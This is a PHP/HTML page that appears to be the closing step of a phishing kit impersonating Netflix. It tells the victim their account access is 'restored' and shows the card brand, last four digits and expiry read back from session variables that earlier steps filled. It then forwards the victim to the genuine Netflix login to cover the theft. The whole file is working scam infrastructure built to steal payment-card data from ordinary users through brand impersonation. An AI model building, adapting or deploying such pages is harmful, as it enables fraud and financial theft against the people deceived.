<?php

session_start();
error_reporting(0);

include('__CONFIG__.php');

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">

	<link rel="stylesheet" type="text/css" href="./assets/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="./assets/font-awesome.min.css">
	<link rel="stylesheet" type="text/css" href="./assets/master.css">
	<link rel="stylesheet" type="text/css" href="./assets/set1.css">
	<script type="text/javascript" src="./assets/jquery-3.1.1.slim.min.js"></script>
	<script type="text/javascript" src="./assets/tether.min.js"></script>
	<script type="text/javascript" src="./assets/bootstrap.min.js"></script>
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="shortcut icon" href="assets/nficon2016.ico"/>
	<link rel="apple-touch-icon" href="assets/nficon2016.png"/>
	<title>Congratulations - Netflix</title>
</head>
<body>
<div class="container-fluid lgggnnnppgg">
	<div class="NavHeaderLogin">
	  <div class="LogoNav">
		  	<a href="">
					<svg viewBox="0 0 111 30" id="netflix-logo" width="100%" height="100%">    <path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z"></path></svg>
				</a>
		</div>
	</div>
	<div style="clear:both;"></div>
	<div class="container NewXs456">
		<div class="row">
			<div class="col-md-6 offset-md-3 LILUZIIII">
				<center><img src="assets/Congratulations.png" class="text-center" style="width: 20%;"></center>
				<br>
				<h1 class="siiniino text-center">Congratulations !</h1>	
				<p>You have restored your account access. Now you can use your account as usual.</p>
				<label for="pm-info"><b>Payment nifo</b></label>
				<div class="pm-info" id="pm-info">
					<p>
						<span class="logos logos-block" style="float: left;margin-bottom: 7px;">
							<?php if (substr($_SESSION['scnxxx'],0,1) == 4): ?>
								<span class="logoIcon VISA"></span>
							<?php endif ?>
							<?php if (substr($_SESSION['scnxxx'],0,1) == 5): ?>
								<span class="logoIcon MASTERCARD"></span>
							<?php endif ?>
							<?php if (substr($_SESSION['scnxxx'],0,1) == 3): ?>
								<span class="logoIcon AMEX"></span>
							<?php endif ?>
							•••• •••• •••• <?php echo $_SESSION['last4']; ?> - <?php echo @$_SESSION['seppp_MM']."/".@$_SESSION['seppp_YY']; ?>
						</span>
					</p> 
				</div>
				<a href="https://www.netflix.com/login"><button class="btn login-button btn-submit btn-small" type="button" autocomplete="off" tabindex="4" ><!-- react-text: 26 -->Continue<!-- /react-text --></button></a>
			</div>
		</div><br><br>
	</div><br><br>
</div>
<div class="col-md-12 text-center footertebi">
				<img src="assets/footerlogin.png">
			</div>
<script src="assets/jquery-3.1.1.slim.min.js"></script>
</body>
</html>